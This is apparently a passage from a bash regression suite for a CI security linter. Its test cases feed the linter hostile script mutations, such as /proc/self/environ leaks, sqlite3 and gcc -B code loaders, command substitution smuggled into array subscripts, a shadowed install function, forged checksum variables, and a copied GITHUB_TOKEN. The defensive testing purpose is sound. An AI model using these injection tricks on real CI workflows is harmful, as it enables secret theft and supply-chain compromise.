t promptfile-printf 1 "helper-promptfile-rebind" happy.sarif "$PR${FS}set -euo pipefail${FS}a${FS}printf -v leak '/proc/%s/%s' self environ${RS}$PR${FS}printf -v leak '/proc/%s/%s' self environ${FS}a${FS}echo \"prompt_file=\${leak}\" >> \"\${GITHUB_OUTPUT}\""
t promptfile-assign 1 "helper-promptfile-rebind" happy.sarif "$PR${FS}set -euo pipefail${FS}a${FS}prompt_file=/tmp/evil"

# --- installer errexit tracking (CodeRabbit: set -o pipefail FP) ---
t errexit-pipefail-fp 0 "" happy.sarif "$I${FS}set -euo pipefail${FS}r${FS}set -euo pipefail${FS}set -e -o pipefail"

# --- sqlite3 loader (Codex P1: .shell execution) ---
t loader-sqlite3 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sqlite3 :memory: \".shell bash evil.sh\""

# --- installer shadow (Codex P1: install() function override) ---
t installer-shadow-fn 1 "muse-installer-shadow" happy.sarif "$I${FS}install -m 0755${FS}b${FS}install() { cp evil \"\${@: -1}\"; }"
t installer-shadow-alias 1 "muse-installer-shadow" happy.sarif "$I${FS}install -m 0755${FS}b${FS}alias install=evil"

# --- installer exit range (Codex P1: exit 256 wraps to 0) ---
t installer-exit-256 1 "muse-installer-no-compare" happy.sarif "$I${FS}3:exit 1${FS}r${FS}exit 1${FS}exit 256"
t installer-exit-255-fp 0 "" happy.sarif "$I${FS}3:exit 1${FS}r${FS}exit 1${FS}exit 255"

# --- arithmetic recursion (Codex P1: printf-built subscript) ---
t arith-recurse-printf 1 "helper-arithmetic-sub" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v payload 'arr[\044(bash evil.sh)]'${RS}$H${FS}printf -v payload 'arr[\044(bash evil.sh)]'${FS}a${FS}: \$(( payload++ ))"
t arith-recurse-cmdform 1 "helper-arithmetic-sub" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read payload${RS}$H${FS}read payload${FS}a${FS}(( payload > 0 ))"
t arith-counter-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}n=\$(wc -c < /dev/null)${RS}$H${FS}n=\$(wc -c < /dev/null)${FS}a${FS}: \$(( n + 1 ))"

# --- env alias smuggle (Codex P1: env: *agent_env) ---
t agent-env-alias 1 "agent-token-expression" happy.sarif "$S${FS}GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}${FS}a${FS}          LEAKED_GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}${RS}$S${FS}5:        env:${FS}r${FS}        env:${FS}        env: *agent_env${RS}$S${FS}2:        env:${FS}r${FS}        env:${FS}        env: &agent_env${RS}$S${FS}          META_API_KEY: \${{ secrets.META_API_KEY }}${FS}d${RS}$S${FS}          PROMPT_FILE: \${{ steps.diff.outputs.prompt_file }}${FS}d${RS}$S${FS}          MUSE_MODEL: \${{ env.MUSE_MODEL_RESOLVED }}${FS}d${RS}$S${FS}          MUSE_EFFORT: \${{ env.MUSE_EFFORT_RESOLVED }}${FS}d${RS}$S${FS}4:          SCRIPT_DIR: \${{ steps.scriptdir.outputs.dir }}${FS}d"
t agent-env-alias-unresolved 1 "agent-env-alias" happy.sarif "$S${FS}5:        env:${FS}r${FS}        env:${FS}        env: *missing_anchor"

# --- gcc loader (Codex P1: gcc -B executes workspace cc1) ---
t loader-gcc 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gcc -B\"\${GITHUB_WORKSPACE}/evil-bin/\" -c input.c"
t loader-gcc-versioned 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gcc-13 --version"
t loader-gcc-cross 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x86_64-linux-gnu-gcc --version"
t loader-mycc-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mycc --version"

# --- escaped-quote comment (Codex P1: \" closes the quote) ---
t helper-escaped-quote 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf \"%s\" \"x\\\"#y\" >/dev/null; bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t helper-escaped-quote-pin 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"x\\\";y\" >/dev/null"

# --- subscript builtins (Codex P1: test -v et al reparse) ---
t helper-test-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}test -v 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' || true"
t helper-declare-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=x'"
t helper-local-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}local 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=x'"
t helper-readonly-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}readonly -a 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=x'"
t helper-printfv-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]' '%s' x"
t helper-read-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")' <<< x"
t helper-unset-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}unset 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")'"
t helper-let-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}let 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]=1'"
t helper-if-test-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}if test -v 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]'; then :; fi"
t helper-while-read-subscript 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}while read 'arr[\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")]'; do :; done <<< x"
t helper-declare-value-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare 'x=a[\$(date)]'"
t helper-read-prompt-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read -p 'pick [a] \$(date)' name"
t helper-cond-value-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}[[ -v 'x=\$(date)' ]] || true"

# --- comparison-operand freeze (Codex P1: want_sha="${got_sha}") ---
t operand-rebind-want 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}want_sha=\"\${got_sha}\""
t operand-rebind-got 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}got_sha=\"\${want_sha}\""
t operand-rebind-read 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}read want_sha <<< forged"
t operand-rebind-nameref 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n ref=want_sha"
t operand-rebind-let 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}let want_sha=0"
t operand-rebind-arith 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}(( want_sha = 0 ))"
t operand-rebind-mapfile 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}mapfile -t want_sha < /tmp/forged"
t operand-rebind-getopts 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}getopts \"ab\" want_sha"
t operand-rebind-for 1 "muse-installer-operand-rebind" happy.sarif "$I${FS}got_sha=${FS}a${FS}for want_sha in x; do :; done"
t operand-prehash-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}b${FS}want_sha=\"\${SHA_X86_LINUX}\""
t operand-compare-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}(( got_sha == 0 )) || true"

# --- assign-prefix peel (self-found: a[0]=x prefixes commands) ---
t runner-peel-subscript 1 "agent-invocation-count" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}a[0]=x muse --version"
t runner-peel-pluseq 1 "agent-invocation-count" happy.sarif "$R${FS}muse_rc=\$?${FS}a${FS}v+=x muse --version"

printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
[[ "$fail" -eq 0 ]]
